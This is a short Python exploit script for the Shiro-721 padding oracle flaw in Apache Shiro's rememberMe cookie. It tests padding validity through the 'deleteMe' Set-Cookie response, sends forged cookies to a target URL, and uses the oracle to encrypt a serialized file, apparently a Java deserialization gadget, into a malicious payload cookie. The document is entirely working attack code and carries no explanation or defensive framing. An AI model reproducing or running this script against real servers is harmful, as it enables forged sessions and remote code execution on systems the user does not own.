from padding_oracle_attack import payload_model
from requests import Request, Response, get
from grequests import request
from base64 import b64decode, b64encode
from Crypto.Util.Padding import pad

#shiro-721 payload
class Payload(payload_model):

    def __init__(self, data="", fake=False , rememberMe = ""):
        super().__init__(data, fake)
        self.rememberMe = rememberMe

    def padding_ok(self, resp:Response):
        if 'deleteMe' in resp.headers["Set-Cookie"]:
            return False
        else:
            return True

    def recover_fake_data(self, req:Request, fake_datas):
        rememberMe = self.rememberMe
        for fake_data in fake_datas:
            if b64encode((b64decode(rememberMe) + fake_data)).decode() == req._cookies.get("rememberMe"):
                return fake_data
        return None

    def make_request(self, fake_data) -> request:
        rememberMe = self.rememberMe
        rememberMe = b64encode((b64decode(rememberMe) + fake_data)).decode()
        cookies = {
            "rememberMe": rememberMe
        }

        return request("get", "http://win.com:8080/shiro721", cookies=cookies)

if __name__ == "__main__":
    c = "zVDFRNC7qW7UQn1G+Vxz0UupzWXQbfzAe3QAMJOJnNd1FRd3YHKhI8Pk3EkEvGf3Bieo/hiIBtEsibIROHQgS42iJ31iH9UOvL+MnyOMVq6ta5PXAD62YrtP/GsNwvLDMIPaPfPZ/+4LRs2LsoPa/PSU1yj+XkvWA6JDX/zghXS4cOej0bNVO0DlHYnu01G8xmeekEfz9odTBzD/K3n9rEB2OoDShExGxgh3S2bYqA+j0y7BT6+C+LsksJ4OaYr7oc1351U93V5QPgtDsR/u2sqpq6C7afOMaYLXXcDW2P0ILdTp/wV7kMegQ9IZptnqFyrNhf7ffGbqPeVqYbJafwYz00c19TgwZ22fhA4cr/hR81+seWemEwqSAOn3pO67vv6wVsvidDH3klPKrjwi1p+vWjbt/b5ynGmYOxTsfHn/c6MxjAeWE3yTnh8JXP/7f5QNWYmy+AqeDvpa/QVF5SZ6mkeEdHSR7iTRTiNnEIzHpNYnLdNG3yJ6vPmmXQA/"
    exp = open("/home/inhann/ubuntu/padding_oracle_attack/ser", "rb").read()
    payload = Payload(bytes.hex(exp), fake=True , rememberMe=c)
    data = payload.run()
    payload_cookie = b64encode(data).decode()
    print("[+] payload cookie :" , payload_cookie)